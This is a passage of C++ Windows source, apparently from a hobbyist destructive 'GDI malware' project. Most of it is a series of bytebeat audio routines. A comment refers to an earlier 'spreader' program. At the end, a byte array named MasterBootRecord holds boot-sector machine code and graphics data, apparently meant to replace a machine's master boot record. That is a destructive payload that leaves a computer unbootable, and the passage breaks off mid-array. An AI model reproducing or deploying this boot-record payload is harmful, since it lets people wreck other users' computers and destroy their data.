	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((128 * cbrt(t >> int(sqrt(t >> 13)) * t / 127) * (t >> 4))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 22000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 1) * (14 & 20240630 >> (t >> 8 & 28)) | t >> 13 >> (t >> 7) ^ t >> 8) + (t >> 9 & t >> 1));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> 9) & (t * ((t >> 11) | (t >> 12))) & 63 ^ (t & (t >> 23) | (t >> 2)) & t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 22000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((11 * (t * (4 | (t >> 5 - (t >> 14) % 11) % 4) & (5 << (t >> 14) % 4) * (1 | (t >> 15) % 8)) * t >> 2) & (64 + (127 & t >> 6)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 16384, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(128 * cos((((((t * 100) / 81) % 81) / 100.f) * t * sin(t / 8000.f) / PI) / 800.75f) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 11025.114514, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((abs((7 * (t >> 8 | t | t >> 7) - 8 * (t & t >> 91 | t >> 9) - 1 * (t ^ 91)) % 256 - 128) * 199 / 100));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {
	int nSamplesPerSec = 11025.114514, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((t * (1 + (1 ^ t >> 4 & 5)) & (14 + (3 & t >> 11))) * 101) + (t * (3 & t >> 1))) & 127) + ((800000 / (1 + (t % 4095))) & 128));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 11025.114514, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(128 * cos((sqrt(t >> 2) * (t & 1145 ? -1 : 4) * (3 + (3 & t >> (t & 114 ? 5 : 14)))) / 40.75) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 22050.114514, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(cbrt(t * (t >> 6 & t + 13) / 26) + cos(t / 169)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t / 11 >> t % 45 + 14 | t / ((50 + t & 3) + 3) >> t % ((13 - (t >> 7) % 8 * 9) + 1)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(128 * cos(((cos(t / 7813.) * sin(t / 1145.) * t) * 128 / PI) / 800.75) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(128 * cos((((t >> 14 | t) << (t & 1040 ? t & (t >> 20) : t * (~((t >> 2) % 128)) ? t >> 8 : t * 3)) >> (t & 5033)) / 40.75) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat15() {//modified from my skidded shit:kelp spreader.exe
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t * (t & (91 << 13 + (t >> 78 & 13)) + 13) + 7 >> 8) + (t * 91)) & 128) % 256 / 3 + 40 * cos(32 * cbrt(t % 8192)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat16() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((abs((t / (3 + ((t >> 14 & t >> 1 ^ t >> 5) & 92)) * ((t >> 6 | t >> 5 | t >> 35) & 89)) % 256 - 128) + 5033));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat17() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((1.05033f * cos(((t * "20240630"[t >> 13 & 7]) + 2))) + 11 / ((t >> 4) + 5) % ((t * t >> 1) + 4)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat18() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((("202406303546619314178489"[(t >> 11) % 4] * t >> 5 & 127) + (t >> 8) & 128) + ("5033,7891"[(t >> 13) % 7] * t >> 8 & 127) + (128 * cos(4095 >> (t % 16384))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat19() {
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * ((t >> 11) % 4 + 5) & t * ((t >> 11 & 4 | t >> 5 & 14 | t >> 19 & 19) & 8 | (t >> 10) % 78) - (-t >> 91));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat20() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((114 * (((5 * t) | (t >> 14)) & ((1 * t) | t ^ 91 | (t >> 9)))) | (t >> (((t & 8192) == 0) | 2)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat21() {
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * fabsl(cosf(t >> 3 | ~t >> 4))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
const unsigned char MasterBootRecord[] = { 0xBB,0xE0,0x07,0x8E,0xC3,0x8E,0xDB,0xB8,0x16,0x02,0xB9,0x02,0x00,0xB6,0x00,0xBB,0x00,0x00,0xCD,0x13,0x31,0xC0,0x89,0xC3,0x89,0xC1,0x89,0xC2,0xBE,0x00,0x00,0xBF,0xB3,0x0D,0xAC,0x81,0xFE,0xB3,0x0D,0x73,0x31,0x3C,0x80,0x73,0x02,0xEB,0x0F,0x24,0x7F,0x88,0xC1,0xAC,0xAA,0xFE,0xC9,0x80,0xF9,0xFF,0x75,0xF7,0xEB,0xE4,0xB4,0x00,0x3C,0x40,0x72,0x05,0x24,0x3F,0x88,0xC4,0xAC,0x89,0xC1,0xAD,0x89,0xF2,0x89,0xFE,0x29,0xC6,0xAC,0xAA,0xE2,0xFC,0x89,0xD6,0xEB,0xC8,0xB8,0x13,0x00,0xCD,0x10,0xBB,0xE0,0x07,0x8E,0xDB,0xBE,0xB3,0x0D,0xB4,0x00,0xAC,0xBB,0x00,0x00,0x89,0xC1,0xBA,0xC8,0x03,0x88,0xD8,0xEE,0x43,0xBA,0xC9,0x03,0xAC,0xEE,0xAC,0xEE,0xAC,0xEE,0xE2,0xEE,0xBB,0x00,0xA0,0x8E,0xC3,0xBF,0x00,0x00,0xB9,0x00,0x7D,0xF3,0xA5,0xF4,0xEB,0xFD,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA,0xFF,0xA5,0x13,0x12,0x26,0x00,0x00,0x00,0x1C,0x1C,0x1C,0x2C,0x2D,0x19,0x00,0x00,0x0C,0x3F,0x3F,0x3F,0x1B,0x1B,0x31,0x13,0x13,0x27,0x0B,0x